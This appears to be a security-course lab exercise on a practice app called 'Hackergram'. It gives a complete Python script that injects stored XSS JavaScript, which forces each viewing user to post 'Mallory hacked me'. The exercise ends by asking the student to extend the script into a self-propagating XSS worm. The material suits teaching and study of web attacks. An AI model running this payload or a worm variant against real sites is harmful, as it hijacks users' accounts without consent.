# XSS Worm

In this attack you will create an XSS worm using the posts feature, which leverages the DOM of the page. The following code makes the victim create a post with the content ```"Mallory hacked me"```.

``` py
# XSS virus in New Post form

import requests
import sys

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit(session):
    data = (
        '<script type="text/javascript" id="virus">\n'
        'window.onload = function(){{\n'
        'var url = "{}/create_post";\n'
        'var params = "&content=Mallory hacked me" + "" + "";\n'
        'var http = new XMLHttpRequest();\n'
        'var a = document.getElementById("user").outerHTML.search("mallory");\n'
        'if (a < 0) {{\n'
        'http.open("POST", url, true);\n'
        'http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\n'
        'http.onreadystatechange = function() {{\n'
        'if(http.readyState == 4 && http.status == 200) {{\n'
        '}}\n'
        '}}\n'
        'http.send(params);\n'
        '}}\n'
        '}}\n'
        '</script>\n'
    ).format(SERVER)
    payload = {
        'content': data,
    }
    r = session.post(SERVER+"/create_post", data=payload)
    print(r)

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit(s)
```

Do the following:

1. Run the script on the attacker.
2. Login as ```mr_robot``` and check that a post has been created on behalf of ```mr_robot``` with the content "Mallory hacked me". Check that a new post is created when reloading Hackergram's homepage or any other page that displays posts.
3. Repeat the procedure for other users.

Now, modify the script so that the attack turns into a true XSS worm, i.e., so that it achieves self-propagation. 